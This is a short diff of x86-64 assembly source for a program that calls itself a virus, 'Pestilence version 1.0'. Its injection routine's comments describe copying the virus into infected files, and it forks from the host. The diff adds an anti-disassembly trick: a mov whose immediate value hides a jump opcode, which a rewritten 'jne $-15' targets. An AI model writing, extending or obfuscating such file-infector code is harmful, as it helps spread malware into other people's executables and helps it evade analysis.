@@ -4,9 +4,11 @@
 ;|                | |__) |__  ___| |_ _| | ___ _ __   ___ ___                  |
 ;|                |  ___/ _ \/ __| __| | |/ _ \ '_ \ / __/ _ \                 |
 ;|                | |  |  __/\__ \ |_| | |  __/ | | | (_|  __/                 |
-;|                |_|   \___||___/\__|_|_|\___|_| |_|\___\___|                 |
+;|________________|_|   \___||___/\__|_|_|\___|_| |_|\___\___|_________________|
 ;|                                                                             |
 ;-------------------------------------------------------------------------------
+
+
 
 %include "pestilence.inc"
 
@@ -35,16 +37,20 @@ _start:
 	call _inject; push addr to stack
 
 signature db `Pestilence version 1.0 (c)oded by lmartin`, 0x0; sw4g signature
+debug_msg db `DEBUGGING..`, 0x0; sw4g signature
 
 _inject:
 	pop r8; pop addr from stack
 	sub r8, 0x5; sub call instr
 	; r8 contains the entry of the virus (for infected file cpy)
 
+	mov rax, 0x4242422aeb424242
+
 	; copy the prg in memory and launch it
 	xor rax, rax; = 0
 	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
-	jne .infected
+	jne $-15
+
 
 	mov rax, SYSCALL_FORK; fork
 	syscall
